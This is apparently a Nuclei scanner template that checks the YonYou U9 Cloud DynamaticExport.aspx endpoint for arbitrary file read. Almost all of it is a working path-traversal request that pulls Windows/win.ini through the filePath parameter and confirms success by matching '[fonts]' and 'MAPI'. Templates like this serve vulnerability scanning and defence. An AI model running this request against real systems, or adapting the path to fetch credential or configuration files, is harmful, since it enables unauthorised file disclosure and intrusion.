id: YonYouU9Cloud-DynamaticExport-ReadAnyFile

info:
  name: YonYouU9Cloud-DynamaticExport-ReadAnyFile
  author: iSee857
  severity: high
  description: |
    YonYouU9Cloud-DynamaticExport-ReadAnyFile

http:
  - raw:
      - |
        GET /print/DynamaticExport.aspx?filePath=../../../../../../../../../../../../Windows/win.ini HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "[fonts]"
          - "MAPI"
        condition: and

      - type: status
        status:
          - 200